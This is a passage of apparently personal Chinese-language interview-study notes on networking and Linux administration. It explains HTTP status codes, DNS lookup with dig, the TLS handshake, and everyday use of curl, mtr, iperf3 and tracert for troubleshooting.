<code>mtu 9000</code></li><li>重啟服務 <code>/etc/init.d/network-manager restart</code></li><li><strong>經過交換網路設定時，僅修改Host端的MTU值不太行，還續鑰檢查網路設備有無啟用jumbo frames功能</strong></li></ul></li><li>測試MTU<ul><li><code>ping -l 9000 -f &lt;domain&gt;</code></li><li>-f 參數告訴作業系統不能私自更改封包大小</li></ul></li><li>講解一下Email的通訊原理<ul><li>當輸入Email時，”@”後面即為Domain Name<blockquote><p><a href="http://linux.vbird.org/linux_server/0380mail.php#whatmail_dns">http://linux.vbird.org/linux_server/0380mail.php#whatmail_dns</a><br><a href="https://weils.net/blog/2017/04/19/how-email-works-dkim-all-in-one/">https://weils.net/blog/2017/04/19/how-email-works-dkim-all-in-one/</a><br><a href="https://docs.digitalocean.com/support/how-to-troubleshoot-ssh-connectivity-issues/">https://docs.digitalocean.com/support/how-to-troubleshoot-ssh-connectivity-issues/</a><br><a href="https://www.linux.com/topic/networking/4-reasons-why-ssh-connection-fails/">https://www.linux.com/topic/networking/4-reasons-why-ssh-connection-fails/</a><br><a href="https://help.skysilk.com/support/solutions/articles/9000150151-how-to-troubleshoot-ssh-connection-issues-using-vnc-console">https://help.skysilk.com/support/solutions/articles/9000150151-how-to-troubleshoot-ssh-connection-issues-using-vnc-console</a></p></blockquote></li></ul></li><li>DNS設定失敗會怎麼解決?<blockquote><p><a href="https://www.digitalocean.com/community/tutorial_series/an-introduction-to-managing-dns">https://www.digitalocean.com/community/tutorial_series/an-introduction-to-managing-dns</a> </p></blockquote></li><li>可以講解一下HTTP協定運作原理嗎?<br>  <img src="https://i.imgur.com/kwU3Ay7.png"><ul><li>通常由使用者透過瀏覽器或爬蟲來對Server端發出請求</li><li>那其中我們會稱這個client為User Agent，一個代理程式</li><li>而請求的Server上可能也會有一些像是HTML檔案或圖像之類的資源</li><li>當HTTP Client發出請求，建立一個到Server端指定port(預設是80)的TCP連線</li><li>則HTTP Server則會在那個port監聽client的請求</li><li>一旦收到請求，Server會向Client返回一個狀態 ex. “HTTP&#x2F;1.1 200 OK”，以及返回內容或錯誤訊息等等資訊</li><li>HTTP在1.1中加入了保持連線的機制，一個連接可以重複在多個請求&#x2F;回應使用</li><li>可以減少等待時間</li></ul></li><li>那HTTPS呢?<ul><li>就是在進行HTTP連線之前會先進行TLS&#x2F;SSL Handshake</li></ul></li><li>你知道的HTTP狀態碼有哪些?<ul><li>2xx<br>  <img src="https://i.imgur.com/KWTpmAh.png"></li><li>3xx<br>  <img src="https://i.imgur.com/zShTVKk.png"></li><li>400 - Bad Request : 代表送到Server的HTTP Request語法有誤或無效<ul><li>檢查: </li><li><ol><li>URL中的錯誤</li></ol></li><li><ol start="2"><li>與該網站的cookie可能毀損，清除瀏覽器的cookie以及cache</li></ol></li><li><ol start="3"><li>嘗試在不同的web瀏覽器上打開相同的網頁</li></ol></li></ul></li><li>401 - Unauthorized: 代表使用者在未經身分認證的情況下嘗試存取資源，而用戶必須提供credential才可以查看受保護的資源<ul><li>檢查:</li><li><ol><li>檢查URL錯誤，若URL有效，則存取主頁並登入，輸入資訊，然後重試</li></ol></li><li><ol start="2"><li>瀏覽器也可能快取到無效資訊，因此可以清除快取</li></ol></li></ul></li><li>403 - Forbidden: 發生在用戶發出有效請求但Server由於缺乏存取資源的權限而拒絕服務時<ul><li>檢查: </li><li><ol><li>確保Server中 &#x2F;www 資料的存取權限是正確的</li></ol></li><li><ol start="2"><li>檢查 .htaccess 設定(.htaccess 文件控制對資源的存取)</li></ol></li><li><ol start="3"><li>若網站沒有index文件，也有可能發生這種情況，這樣須將主頁重新命名為index.html&#x2F;index.php</li></ol></li><li><ol start="3"><li>與網站管理員聯繫已取得存取權限 (應將權限設為讀取)</li></ol></li><li><ol start="4"><li>若其他用戶可以存取，則需要聯絡ISP來解決這個問題</li></ol></li></ul></li><li>404 - Not Found: 代表用戶可與Server通訊，但無法定位所請求的資源<ul><li>檢查:</li><li><ol><li>一樣URL有沒有錯</li></ol></li><li><ol start="2"><li>F5更新網頁</li></ol></li><li><ol start="3"><li>清除瀏覽器快取</li></ol></li><li><ol start="4"><li>修改DNS Server設定</li></ol></li></ul></li><li>500 - Internal Server Error: 這代表網站Server出現問題，Server無法偵測確切問題，但client端還是能夠嘗試以下步驟<ul><li>檢查:</li><li><ol><li>網路流量高，按下F5，重新載入網頁</li></ol></li><li><ol start="2"><li>清除網路瀏覽器快取和cookie</li></ol></li><li><ol start="3"><li>檢查網站的 .htaccess文件被正確建立</li></ol></li><li><ol start="4"><li>檢查文件和資料夾是否有任何不正確的權限</li></ol></li></ul></li><li>502 - Bad Gateway: 代表Server充當gateway或proxy，無法從上游Server獲得有效的Response，這也有可能是由於DNS問題所造成的<ul><li>檢查:</li><li><ol><li>F5鍵，重新載入網頁</li></ol></li><li><ol start="2"><li>關閉所有打開的瀏覽器並啟動新的瀏覽器Session</li></ol></li><li><ol start="3"><li>清空瀏覽器快取</li></ol></li><li><ol start="4"><li>暫時禁用CDN(Content Delivery Network)</li></ol></li><li><ol start="5"><li>重啟網路設備(modem, router etc.)</li></ol></li></ul></li><li>503 - Service Unavailable: 這代表server負載過大，或正在維護中<ul><li>檢查:</li><li><ol><li>F5鍵，重新載入網頁</li></ol></li><li><ol start="2"><li>重啟網路設備(modem, router etc.)</li></ol></li></ul></li><li>504 - Gateway Timeout: 代表Server是Gateway或proxy，在允許的時間內無法從後端server獲得response<ul><li>檢查:</li><li><ol><li>F5鍵，重新載入網頁</li></ol></li><li><ol start="2"><li>重啟網路設備(modem, router etc.)</li></ol></li><li><ol start="3"><li>變更DNS Server(若你網路中的所有設備都收到相同錯誤)</li></ol></li><li><ol start="4"><li>仍然有錯誤可能要聯絡網管或ISP</li></ol></li></ul></li></ul></li><li>可以講解一下SMTP運作原理嗎?</li><li>可以講解一下DNS的運作原理?<ul><li>有分成兩種，一種是授權型DNS另一種是遞迴型server</li><li>授權型會接收並回應DNS查詢服務，一層一層找到root DNS Server</li><li>遞迴型則本身沒有DNS Record，但它會將請求傳遞給授權DNS Server去取得IP位址</li><li>運作流程:<ul><li>當輸入<a href="http://www.ntust,edu.tw/">www.ntust,edu.tw</a> 時，DNS Server會接收到查詢IP位址的請求</li><li>DNS Server會開始查詢<a href="http://www.example.com/">www.example.com</a> 的IP位址</li><li>並檢查local DNS Server的Cache中有沒有dns record<ul><li>會去 <code>/etc/resolv.conf</code> 查找，將網域變更為FQDN</li></ul></li><li>若沒有則會去root DNS Server去查找</li><li>root DNS Server會去告知DNS Server 「管理tw的DNS Server」的IP地址</li><li>而local DNS Server取得該IP後就會去發出DNS請求<ul><li><code>dig tw ns +short</code></li></ul></li><li>而管理tw的DNS Server會去告訴local DNS Server 「管理 edu.tw的DNS Server」的IP位址<ul><li><code>dig @nameserver edu.tw ns</code></li><li><code>dig @a.dns.tw edu.tw ns +short</code></li></ul></li><li>而local DNS Server取得該IP後就會去發出DNS請求</li><li>管理edu.tw的DNS Server會去告訴local DNS Server 「管理ntust.edu.tw的DNS Server」的IP位址<ul><li><code>dig @nameserver ntust.edu.tw ns +short</code></li></ul></li><li>接著local DNS Server就會去對該IP位址發出請求<ul><li><code>dig @RealAuthorieServer ntust.edu.tw a +short</code></li></ul></li><li>則管理ntust.edu.tw的DNS Server會返回<a href="http://www.ntust.edu.tw的ip位址/">www.ntust.edu.tw的IP位址</a></li></ul></li></ul></li><li>可以講解一下TLS&#x2F;SSL Handeshake的過程嗎?<br>  <a href="https://www.cloudflare.com/zh-tw/learning/ssl/what-happens-in-a-tls-handshake/">https://www.cloudflare.com/zh-tw/learning/ssl/what-happens-in-a-tls-handshake/</a><br>  <img src="https://i.imgur.com/4EOqjes.png"><br>  運作在Session Layer，主要會在通訊雙方交換資訊並互相驗證，並透過他們所使用的通訊加密演算法並產生一致的工作金鑰<ul><li>TLS 握手什麼時候發生？<ul><li>用戶導航到一個使用 HTTPS 的網站，瀏覽器首先開始查詢網站的原始伺服器，這時就會發生 TLS 握手。</li><li>在任何其他通信使用HTTPS時（包括 API 調用和 DNS over HTTPS 查詢），也會發生 TLS 握手。</li><li>通過 TCP Handshake 打開 TCP 連接後，將發生 TLS Handshake</li></ul></li><li>TLS Handshake過程中發生啥事?<ul><li>client與server之間會進行以下操作:<ul><li>指定TLS版本(TLS 1.0、1.2、1.3)</li><li>決定所使用的密碼學套件</li><li>透過Server的公開密鑰和SSL憑證頒發機構的電子簽章去驗證Server的身分</li><li>生成工作階段金鑰，以便在握手完成後使用對稱加密</li></ul></li></ul></li><li>TLS Handshake的步驟是甚麼?<ul><li>具體步驟會隨著使用的金鑰交換演算法的不同而不同</li><li>最常用的是<strong>RSA</strong>金鑰交換演算法<ul><li><strong>Client Hello:</strong><ul><li>client對server發出hello消息來進行Handshake，其中包含了用戶端支援的TLS版本，支援的密碼套件、以及一個client隨機亂數</li></ul></li><li><strong>Server Hello:</strong><ul><li>回覆client hello，server回傳訊息中包含:</li><li>SSL憑證 <code>這是哪來的?怎麼產生的?</code></li><li>伺服器選擇的密碼套件</li><li>server隨機亂數</li></ul></li><li><strong>身分認證</strong><ul><li>client端使用頒發該憑證的憑證授權驗證伺服器的 SSL 憑證</li><li>此舉確認Server是其聲稱的身份，且client正在與該domain的實際所有者進行互動</li></ul></li><li><strong>premaster secret</strong><ul><li>client端再發送一串隨機位元組，即premaster secret</li><li>premaster secret使用公開金鑰加密(是client從SSL憑證中取得公鑰，來進行加密的)</li><li>只能使用server的secret key進行解密</li></ul></li><li><strong>secret key被使用</strong><ul><li>server透過私鑰對premaster secret進行解密</li></ul></li><li><strong>生成工作階段金鑰</strong><ul><li>client 與 server端均使用client亂數、server亂數和premaster secret去生成工作階段金鑰</li></ul></li><li><strong>client就緒</strong><ul><li>client會發送一條<strong>已完成</strong>的消息</li></ul></li><li><strong>server就緒</strong> <ul><li>server會發送一條<strong>已完成</strong>的消息</li></ul></li></ul></li><li>所有 TLS 握手都使用非對稱加密（公開金鑰和私密金鑰），但並不是所有的 TLS 握手都會在生成工作階段密鑰的過程中使用私密金鑰。例如，臨時 <strong>Diffie-Hellman</strong> 握手的步驟如下：<ul><li><strong>Client Hello</strong><ul><li>包含協定版本、client亂數、密碼學套件清單</li></ul></li><li><strong>Server Hello</strong><ul><li>包含SSL憑證、選定的密碼套件、Server亂數</li></ul></li><li><strong>server的數位簽章</strong><ul><li>server使用其私鑰對client亂數、server亂數以及DH參數進行加密</li><li>加密後的資料用作伺服器的數位簽章</li><li>已確定Server中具有與SSL憑證中的公鑰匹配的私鑰</li></ul></li><li><strong>Server與Client計算premaster secret</strong><ul><li>client與server使用交換的DH參數分別計算匹配的premaster secret</li><li>而不像RSA Handshake那樣由用戶端生成premaster secret並將其發送到server</li></ul></li><li><strong>建立工作階段金鑰</strong><ul><li>client與server從premaster secret、client亂數、server亂數中計算工作階段金鑰</li></ul></li><li><strong>client就緒</strong><ul><li>client會發送一條<strong>已完成</strong>的消息</li></ul></li><li><strong>server就緒</strong> <ul><li>server會發送一條<strong>已完成</strong>的消息</li></ul></li></ul></li></ul></li></ul></li><li><a href="https://segmentfault.com/a/1190000021778053">TLS Handshake失敗可能原因會是甚麼?</a><ul><li>常見錯誤訊息:<code>SSL Handshake Failed error</code></li><li>常見錯誤原因:<ul><li>協定不匹配  <code>server端出錯</code></li><li>加密套件不匹配 <code>server端出錯</code> → Server端不支援client請求使用的加密套件</li><li>系統時間不準確 (可是剛剛過程沒用到時間資訊阿:|)</li><li>瀏覽器設定錯誤</li><li>憑證錯誤 <code>server端出錯</code><ul><li>憑證中的domain name與URL中的domain name不符</li><li>憑證過期</li><li>或憑證鏈出錯</li><li>使用自簽名的憑證</li></ul></li><li>Server啟用了SNI-Enabled <code>server端出錯</code></li></ul></li><li><strong>協定不匹配</strong><ul><li>透過 <code>tcpdump -i any -s 0 host IP address -w File name</code> 在client或server上蒐集資訊</li><li>透過wireshark去分析蒐集的packet</li><li>去找<strong>client hello</strong>所使用的TLS版本</li><li>去看Sever端之後後續處理的錯誤資訊</li><li><a href="https://docs.apigee.com/api-platform/troubleshoot/runtime/ssl-handshake-failures">https://docs.apigee.com/api-platform/troubleshoot/runtime/ssl-handshake-failures</a></li></ul></li></ul></li><li>網站憑證過期該怎麼辦?<ul><li>去更新憑證</li></ul></li><li>可以講解一下甚麼是SSL嗎?<ul><li>全名是Secure Soekcts Layers，用來確保兩個系統之間所傳遞的敏感資料被竄改或讀取</li><li>TLS就是更安全的SSL版本</li></ul></li></ul><h2 id="Linux-Admin"><a href="#Linux-Admin" class="headerlink" title="Linux Admin"></a>Linux Admin</h2><blockquote><p>感覺偏向指令使用或config如何設定</p></blockquote><ul><li>在Linux中你會怎麼管理User跟Group?那在Windows中你又會怎麼做管理?<ul><li>看user<code>cat /etc/passwd</code></li><li>新增user <code>useradd</code></li><li>新增group <code>groupadd</code></li><li>再透過 <code>gpasswd</code> 將使用者加入或移除 root (sudo) 權限群組</li></ul></li><li>可以講解一下<code>curl</code> 指令的原理嗎?<ul><li>一個command line工具可以傳遞資料到server中</li></ul></li><li>你會怎麼使用 <code>curl</code> 這個指令來做Troubleshooting?<ul><li><code>$ curl protocol://IP/host:port</code></li><li>Troubleshooting Web Servers<ul><li><code>curl http://example.com -I</code> 透過-I參數來返回Header</li></ul></li><li>Troubleshooting SMTP Servers <ul><li><code>curl smtp://example.com</code> 預設使用 port 25 作為SMTP Port</li><li>但某些ISP會阻擋標準SMTP port來防止SPAM</li><li>亦可使用 2525 或 587 port</li></ul></li><li>Troubleshooting FTP<ul><li><code>curl ftp://example.com</code> 預設使用21 port</li></ul></li></ul></li><li>如何使用 <code>curl</code> 指令並透過proxy來連接?<ul><li><code>curl --proxy yourproxy:port https://yoururl.com</code></li></ul></li><li>如何透過 <code>curl</code> 略過檢查自簽SSL憑證的有效性?<ul><li><code>curl -k https://localhost/</code></li><li><code>curl --insecure https://localhost/</code></li></ul></li><li>curl 各種用法:<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ curl [protocol://domain:port/]</span><br><span class="line">$ curl -o &lt;欲下載的檔名&gt; [protocol://domain:port/] 下載特定檔案</span><br><span class="line">$ curl -O [protocol://domain:port/file]  直接下載網址中的檔案</span><br><span class="line">$ curl -C - -O [protocol://domain:port/file] 從剛剛被中斷的地方繼續下載</span><br><span class="line">$ curl -L [protocol://domain:port/] 跟隨網址的301/302 redirect</span><br><span class="line">$ curl --trace-ascii debugdump.txt [protocol://domain:port/] 追蹤整個curl過程，並將結果存入debugdump.txt檔案</span><br></pre></td></tr></table></figure></li><li>curl 進行HTTP Request<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">-X/--request [GET|POST|PUT|DELETE|PATCH]  使用指定的 http method 來發出 http request</span><br><span class="line">-H/--header                           設定 request 裡所攜帶的 header</span><br><span class="line">-i/--include                          在 output 顯示 response 的 header</span><br><span class="line">-d/--data                             攜帶 HTTP POST Data </span><br><span class="line">-v/--verbose                          輸出更多的訊息方便 debug</span><br><span class="line">-u/--user                             攜帶使用者帳號、密碼</span><br><span class="line">-b/--cookie                           攜帶 cookie（可以是參數或是檔案位置）</span><br></pre></td></tr></table></figure></li><li>透過 curl去POST資料到 HTML Form<ul><li>假設收到的Form表單的HTML長這樣  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;form method=&quot;POST&quot; action=&quot;form.php&quot;&gt;</span><br><span class="line">   &lt;input type=text name=&quot;email&quot;&gt;</span><br><span class="line">   &lt;input type=submit name=press value=&quot; OK &quot;&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure></li><li><code>curl -X POST --data &quot;email=test@example.com&amp;press=%20OK%20&quot; http://www.example.com/form.php</code></li></ul></li><li>透過 curl去進行檔案上傳<ul><li>假設收到的Form表單的HTML是  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;form method=&quot;POST&quot; enctype=&#x27;multipart/form-data&#x27; action=&quot;upload.php&quot;&gt;</span><br><span class="line">&lt;input type=file name=upload&gt;</span><br><span class="line">&lt;input type=submit name=press value=&quot;OK&quot;&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure></li><li><code>curl -X POST -F &#39;file=@./upload.txt&#39; http://www.example.com/upload.php</code></li></ul></li><li>透過curl常見的RESTFul CRUD指令:<ul><li>GET單一或全部資源  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ curl -X GET &quot;http://www.example.com/api/resources&quot;</span><br><span class="line">$ curl -X GET &quot;http://www.example.com/api/resources/1&quot;</span><br></pre></td></tr></table></figure></li><li>POST JSON資料  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ curl -X POST -H &quot;Content-Type: application/json&quot; -d &#x27;&#123;&quot;status&quot;:false,&quot;name&quot;:&quot;Jack&quot;&#125;&#x27; &quot;http://www.example.com/api/resources&quot;</span><br></pre></td></tr></table></figure></li><li>PUT JSON資料  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ curl -X PUT -H &quot;Content-Type: application/json&quot; -d &#x27;&#123;&quot;status&quot;:false&#125;&#x27; &quot;http://www.example.com/api/resources&quot;</span><br></pre></td></tr></table></figure></li><li>DELETE 資源   <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ curl -X DELETE &quot;http://www.example.com/api/resources/1&quot;</span><br></pre></td></tr></table></figure></li></ul></li><li><strong>透過curl攜帶cookie</strong><ul><li>在指令中輸入cookie  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ curl --cookie &quot;name=Jack&quot; http://www.example.com</span><br></pre></td></tr></table></figure></li><li>從檔案中讀取cookie  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ curl --cookie stored_cookies_file_path http://www.example.com</span><br></pre></td></tr></table></figure></li></ul></li><li><strong>curl指定攜帶User Agent</strong>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ curl --user-agent &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64)&quot; http://www.example.com</span><br></pre></td></tr></table></figure><ul><li><strong>Basic Authentication:</strong> 若網頁有使用基本的Authentication則可攜帶<code>--user username:password</code> 來通過驗證  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ curl -i --user secret:vary_secret http://www.example.com/api/resources</span><br></pre></td></tr></table></figure></li></ul></li><li>透過curl指令使用proxy做連接<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ curl --proxy yourproxy:port https://youurl.com</span><br></pre></td></tr></table></figure></li><li>curl限定下載速度<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ curl --limit-rate 2000B [URL]</span><br></pre></td></tr></table></figure></li><li><strong>在請求中注入特定Content-Type來處理特定問題</strong><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ curl --header &#x27;Content-Type: application/json&#x27; http://yoururl.com</span><br></pre></td></tr></table></figure></li><li>僅在回應中呈現header<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ curl --head http://yoururl.com</span><br></pre></td></tr></table></figure></li><li><strong>連接 HTTPS&#x2F;SSL URL 並忽略任何 SSL 憑證錯誤</strong><ul><li>當試圖存取SSL&#x2F;TLS憑證的安全URL時候，若出現憑證錯誤或CN不匹配，則會出現以下錯誤<br>  <code>curl: (51) Unable to communicate securely with peer: requested domain name does not match the server&#39;s certificate.</code><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ curl --insecure https://yoururl.com</span><br></pre></td></tr></table></figure></li></ul></li><li>使用特定協定(SSL&#x2F;TLS)連線<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ curl --sslv3 https://yoururl.com</span><br><span class="line">$ curl --tlsv1 https://example.com</span><br><span class="line">$ curl --tlsv1.0 https://example.com</span><br><span class="line">$ curl --tlsv1.1 https://example.com</span><br><span class="line">$ curl --tlsv1.2 https://example.com</span><br><span class="line">$ curl --tlsv1.3 https://example.com</span><br></pre></td></tr></table></figure></li><li>從FTP Server中下載檔案<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ curl -u user:password -O ftp://ftpurl/style.css</span><br></pre></td></tr></table></figure></li><li>可以講解一下MTR指令怎麼用嗎?<ul><li><a href="https://blog.gtwang.org/linux/mtr-linux-network-diagnostic-tool/"><strong>MTR</strong></a><ul><li>指令實作: MTR 在一開始會針對指定的主機，以 traceroute 找出中間的每一個網路節點（閘道器、路由器、橋接器等），然後使用 ping 去檢查每一個節點的網路連線狀況，即時更新在輸出的報表中，讓管理者一目了然。  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mtr www.google.com.tw   </span><br><span class="line">mtr -n www.google.com.tw //統一以ip位址來呈現</span><br><span class="line">mtr -b www.google.com.tw //同時呈現ip位址以及網域名稱</span><br><span class="line">mtr -c 5 www.google.com.tw // 指定ping 上限(ICMP ECHO 上限)</span><br><span class="line">mtr -c 5 -r www.google.com.tw &gt; output.txt //輸出報表</span><br><span class="line"></span><br></pre></td></tr></table></figure>  <img src="https://i.imgur.com/BSFP2pP.png"></li><li>L(Loss): 封包遺失率</li><li>S(Snt,Sent Packet): 封包發送數</li><li>Avg(Average RTT): </li><li>Best(Best RTT):</li><li>Worst(Worst RTT):</li></ul></li><li>所以從這個工具中可以發現甚麼?????</li></ul></li><li>可以講解一下 <code>iperf</code> 指令怎麼使用嗎?<ul><li>&#x3D; <code>iperf3</code>是一種網路頻寬測試工具，可以測試客戶端上傳資料速度</li><li>透過TCP來測量頻寬、確定鏈路品質跟延遲以及抖動和封包遺失</li><li>測時頻寬時，需要同時在server與client端都各執行一個iperf3程式，讓他們互相傳送資料進行測試  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># server端   </span><br><span class="line">iperf3 -s   //打開監聽socket 預設port為5201，開放Server Thread</span><br></pre></td></tr></table></figure>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># client端</span><br><span class="line">iperf3 -c SERVER_IP/HOSTNAME</span><br></pre></td></tr></table></figure></li><li>iperf3 也支援Android以及IOS的使用(有APP)</li><li>指定測試時間  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iperf3 -c SERVER_IP -t 20 -i 4 //測試20秒，每隔4秒輸出一次測試數據</span><br></pre></td></tr></table></figure></li><li>儲存測試結果  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iperf3 -c SERVER_IP --logfile output.txt</span><br></pre></td></tr></table></figure></li><li>指定port  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># Server端</span><br><span class="line">iperf3 -s -p 12345</span><br><span class="line"></span><br><span class="line"># client端</span><br><span class="line">iperf3 -c SERVER_IP -p 12345</span><br></pre></td></tr></table></figure></li><li>多條連線  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#同時使用兩條連線測試</span><br><span class="line">iperf3 -c SERVER_IP -P 2</span><br></pre></td></tr></table></figure></li><li>若要測試UDP傳輸協定效能，可以使用 <code>-u</code> 參數  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iperf3 -c SERVER_IP -u</span><br></pre></td></tr></table></figure></li><li>反向傳輸:測試下載速度(server傳送，cleint接收)<ul><li>預設資料流: client $\rightarrow$ Server  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iperf3 -c SERVER_IP -R</span><br></pre></td></tr></table></figure></li></ul></li><li>IPv4、IPv6  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">iperf3 -c SERVER_IP -f</span><br><span class="line">iperf3 -c SERVER_IP -6</span><br></pre></td></tr></table></figure></li><li>自訂傳送檔案  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iperf3 -c SERVER_ip -F YOUR_FILE</span><br></pre></td></tr></table></figure></li></ul></li><li>可以講解一下 <code>tracert</code> 指令怎麼使用嗎?甚麼情況下你會用到這個指令?<br>主要是用於即時網絡故障排除，以查找封包在通過網路傳輸到其目標地址時所採用的路由路徑<br>主要是透過發送ICMP封包，並設定IP Header上的TTL欄位來達成traceroute功能的<br>每次送出的為3個40bytes的封包，包括source位址，目的位址和封包發出的timestamp到目的地，第一個會是probe(探測用)，然後是走UDP，由於我們不想目的主機處理它們，因此目的埠設定為一個不可能的值<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ tracert -d -h maximum_hops -j host_list -w timeout target_host</span><br><span class="line">-w 要指定等待timeout的毫秒數</span><br></pre></td></tr></table></figure></li><li>當 <code>tracert</code> 指令中出現星號代表甚麼?<ul><li>若tracert出現星號(*)，代表該節點可能有某些防禦措施，使我們的封包被丟棄<ul><li>可能是iptables設定為Drop之類的</li></ul></li></ul></li><li>講解一下 <code>tracert</code> 指令的原理是甚麼嗎?<ul><li>特性1: 主要是透過 TTL(Time_To_Live)值來是現功能的，每經過一個節點，路由器就會幫TTL值減1</li><li>特性2: 主要呼叫者會發出 TTL&#x3D;1的封包，第一個路由器將TTL減1後得到0，不再繼續值轉發此封包</li><li>而會返回一個ICMP Time_Out Response，然後電腦就會從Response中提取出封包經過的第一個gateway地址</li><li>接著發出一個TTL&#x3D;2的ICMP封包，可以獲得第二個gateway地址</li><li>因此依次遞增TTL值便獲取沿途所有Gatewat位址</li></ul></li><li>如果 <code>tracert</code> 回傳response並不是ICMP Time_Out，代表甚麼?<ul><li>大多防火牆或啟用防火牆功能的路由器預設會不返回各種ICMP封包</li><li>其餘路由器或交換器可被admin設定成不返回ICMP Response</li><li><strong>因此 Traceroute程式不一定能夠拿到所有沿途gateway位址</strong><ul><li>當某個TTL值的封包得不到回覆時，並不能停止這一追蹤過程，程式仍然會把TTL遞增然後發出下一個封包，一直到預設會透過參數指定的<strong>追蹤限制(maximum_hops)</strong></li></ul></li></ul></li><li>若無法回應ICMP Response，那又是如何知道封包抵達了?<ul><li>Traceroute在送出UDP datagrams到目的地時，它所選擇送達的port number 是一個一般應用程式都不會用的號碼（<strong>30000 以上</strong>）</li><li>所以當此UDP datagram 到達目的地後該主機會送回一個「<strong>ICMP port unreachable</strong>」的訊息，而當traceroute 收到這個訊息時，便知道目的地已經到達了。</li></ul></li><li>為甚麼traceroute要使用大於30000的port<ul><li>跟UDP規定port號必須小於30000有關</li><li>若使用UDP則可能會因為主機沒有提供 UDP 服務而簡單將封包拋棄，然後不返回任何資訊</li><li>所以使用大於30000的port，目標主機能做的是就是返回一個 <strong>port不可達</strong> 的回應</li></ul></li><li><a href="https://haway.30cm.gg/dns-1-basic/">甚麼是FQDN(完整網域名稱?)</a><ul><li>在&#x2F;etc&#x2F;resolv.conf中，沒有加上”.” 結尾的主機名稱，都會被系統自動附加網域名稱</li><li>然後檔案中的<strong>search</strong> 就是告訴系統可以附加什麼樣的網域名稱  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">domain rsync.tw</span><br><span class="line">nameserver 168.95.1.1 (cache server)</span><br><span class="line">nameserver 8.8.8.8  (cache server)</span><br><span class="line">search hdns.com.tw 